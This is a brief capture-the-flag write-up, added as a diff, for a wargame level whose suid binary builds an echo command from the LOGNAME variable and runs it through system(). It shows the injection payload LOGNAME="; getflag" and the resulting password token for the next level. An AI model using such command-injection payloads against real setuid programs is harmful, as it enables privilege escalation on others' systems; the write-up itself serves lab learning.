@@ -1,0 +1,14 @@
+for this level we have a suid binary own by the user flag07
+
+after disassembling the binary we can see the problem
+	char *cmd;
+	asprintf(&cmd,"/bin/echo %s ", getenv("LOGNAME"));
+	return system(cmd);
+
+the env variable LOGNAME is append to echo command
+so we can inject your getflag command here
+
+$> LOGNAME="; getflag" ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+this token is the level08's password
